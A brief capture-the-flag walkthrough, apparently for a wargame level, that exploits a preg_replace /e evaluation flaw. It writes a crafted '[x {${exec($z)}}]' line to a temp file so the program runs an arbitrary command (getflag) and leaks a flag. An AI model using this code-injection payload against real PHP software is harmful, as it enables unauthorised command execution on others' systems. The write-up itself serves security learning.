# the directory contains two executable files that appear to do the same thing: read a file, and replace some patterns with others
# the pattern [x *] is replaced by the evaluation of y(*) due to the /e suffix, allowing escape characters
# we can use that to evaluate anything matching [x *]

# we create a file that matches the pattern, but also executes the second argument of the program
# [x {\${exec(\$z)}}] is transformed into y("{\${exec(\$z)"}})
echo "[x {\${exec(\$z)}}]" > /tmp/test
# now just run the file with getflag as the second argument
# exec will return the output of getflag and crash the program, displaying it
./level06 /tmp/test  getflag # > wiok45aaoguiboiki2tuin6ub
